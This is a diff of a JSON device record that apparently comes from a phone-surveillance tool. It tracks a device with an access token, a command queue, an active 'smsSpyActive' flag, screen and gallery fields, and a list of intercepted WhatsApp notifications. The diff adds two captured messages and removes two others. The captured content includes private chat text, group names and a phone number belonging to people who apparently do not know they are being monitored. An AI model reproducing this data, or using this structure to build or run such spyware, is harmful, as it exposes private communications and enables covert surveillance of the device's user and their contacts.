@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-CA6D",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "1505d9de1a287ae732b4f22d45e58506",
-    "lastSeen": 1777173709467,
+    "lastSeen": 1777173712848,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:08:43.334Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "jas",
+        "content": "📡 Undangan admin saluran",
+        "time": "26/04 11:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777173714764
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1257 pesan dari 19 chat",
+        "time": "26/04 11:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777173712328
+      },
       {
         "appName": "WhatsApp",
         "sender": "jas",
@@ -4003,22 +4019,6 @@
         "time": "26/04 11:20",
         "pkg": "com.whatsapp",
         "receivedAt": 1777172980581
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎[𝐃𝐖𝐁] 𝐃𝐀𝐄𝐑𝐀𝐇 𝐖𝐎𝐍𝐆 𝐁𝐀𝐂𝐎𝐓 || 𝐍𝐄𝐖 𝐄𝐑𝐀 (84 pesan): ~ kla",
-        "content": "kenapa",
-        "time": "26/04 11:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777172980580
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝙹𝚋¹ 𝚊𝚕𝚕 𝚐𝚊𝚖𝚎 || 𝚙𝚒𝚝𝚎𝚗𝚎𝚜𝚜 x fyd (32 pesan): ~ Bot piteness",
-        "content": "📷 Halo new @⁨+62 858-0314-9270⁩ Selamat Datang di Grup 𝙹𝚋¹ 𝚊𝚕𝚕 𝚐𝚊𝚖𝚎 || 𝚙𝚒𝚝𝚎𝚗𝚎𝚜𝚜 x fyd \njangaan lupa baca rules ya pukimak + jngn nge hama disini ya toll",
-        "time": "26/04 11:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777172980578
       }
     ],
     "galleryPhotos": [],
